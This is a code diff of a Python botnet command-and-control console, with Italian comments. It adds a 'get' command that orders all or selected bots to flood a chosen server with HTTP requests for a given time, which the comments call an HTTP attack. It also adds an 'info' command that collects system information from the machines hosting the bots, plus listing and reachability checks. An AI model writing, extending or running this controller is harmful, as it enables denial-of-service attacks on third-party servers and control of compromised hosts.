@@ -77,54 +77,100 @@ class CC:
                 print(target, " is not reachable over http port: ", e)
         print("Controllo terminato")
 
-    def makeHTTPRequest(self, server, target=""):
+    def makeHTTPRequest(self, server, time=1, target=""):
         print("Invio richiesta...")
         if target == "":
             for k, v in self.activeBot.items():
                 try:
-                    url = "http://" + k + ":" + v[0][0] + "/get"
-                    response = requests.post(url, json={"url": server})
+                    url = "http://" + k + ":" + str(v["http"]) + "/doGet"
+                    response = requests.post(url, json={"url": server, "time":time})
                     res = response.json()
-                    self.activeBot[k] = [v[0], res["status"]]
+                    self.activeBot[k]["status"] = res["status"]
                 except Exception as e:
                     print(e)
         else:
-            port = self.activeBot[target][0]
             try:
-                url = "http://" + target + ":" + port[0] + "/status"
-                response = requests.post(url, json={"url": server})
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/doGet"
+                response = requests.post(url, json={"url": server, "time": time})
                 res = response.json()
-                self.activeBot[target] = [port, res["status"]]
+                self.activeBot[target]["status"] = res["status"]
             except Exception as e:
                 print(e)
         print("Richiesta inviata")
+
+    def getSystemInfo(self, target=""):
+        if target == "":
+            for k, v in self.activeBot.items():
+                try:
+                    url = "http://" + k + ":" + str(v["http"]) + "/getSystemInfo"
+                    response = requests.get(url)
+                    res = response.json()
+                    print("\t-----System info about", k, "-----")
+                    for j,z in res.items():
+                        if len(j) <= 6:
+                            print("\t" + j + ":\t\t\t", z)
+                        else:
+                            print("\t" + j + ":\t\t", z)
+                except Exception as e:
+                    print(e)
+        else:
+            try:
+                url = "http://" + target + ":" + str(self.activeBot[target]["http"]) + "/getSystemInfo"
+                response = requests.get(url)
+                res = response.json()
+                print("\t-----System info about", target, "-----")
+                for j, z in res.items():
+                    if len(j) <= 6:
+                        print("\t" + j + ":\t\t\t", z)
+                    else:
+                        print("\t" + j + ":\t\t", z)
+            except Exception as e:
+                print(e)
+
 
     def command(self, event):
         sleep(1)
         while (True):
             comando = input("C&C@command: ")
+            #Ferma il server
             if comando == "stop":
                 event.set()
                 return
-            if comando == "ls":
+            #Mostra la lista di tutti i bot attivi
+            elif comando == "ls":
                 print("Ip\t\thttp\t\tftp")
                 for k, v in self.activeBot.items():
                     print(f"{k}\t{v['http']}\t\t{v['ftp']}")
-            if comando == "ls -s":
+            #Mostra la lista di tutti i bot attivi ed il relativo stato
+            elif comando == "ls -s":
                 print("Ip\t\thttp\t\tftp\t\tstatus")
                 for k, v in self.activeBot.items():
                     print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['status']}")
-            if comando.startswith("get"):
+            #Comando per eseguire un'attacco http ad un determinato server
+            elif comando.startswith("get"):
                 c = comando.split(" ")
                 if len(c) == 1 or len(c) == 2:
                     print("Command not found")
-                if c[2] == "all":
-                    self.makeHTTPRequest(c[1])
-                elif c[2] in self.activeBot:
-                    self.makeHTTPRequest(c[1], target=c[2])
+                if c[3] == "all":
+                    self.makeHTTPRequest(c[1], time=c[2])
+                elif c[3] in self.activeBot:
+                    self.makeHTTPRequest(c[1], time=c[2], target=c[3])
                 else:
-                    print("Command not found. Correct command [get server all | get server target(ip)]")
-            if comando.startswith("ck"):
+                    print("Command not found. Correct command [get server time all | get server time target(ip)]")
+            #Comando per acquisire informazioni sul sistema che ospita il bot
+            elif comando.startswith("info"):
+                c = comando.split(" ")
+                if len(c) == 1 :
+                    print("Command not found. Correct command [info ip | info all]")
+                elif c[1] == "all":
+                    self.getSystemInfo()
+                else:
+                    if c[1] in self.activeBot:
+                        self.getSystemInfo(target=c[1])
+                    else:
+                        print("Command not found. Correct command [info ip | info all]")
+            #Comando per verificare la raggiungibilità dei bot
+            elif comando.startswith("ck"):
                 c = comando.split(" ")
                 if len(c) == 1:
                     print("Command not found")
@@ -134,7 +180,9 @@ class CC:
                     self.checkBot(target=c[1])
                 else:
                     print("Command not found. Correct command [ck all | ck target(ip)]")
-
+            else:
+                print("Command not found")
+                continue
     # load activeBot from file
     def loadData(self):
         with open("./activeBot.json", 'r') as f:
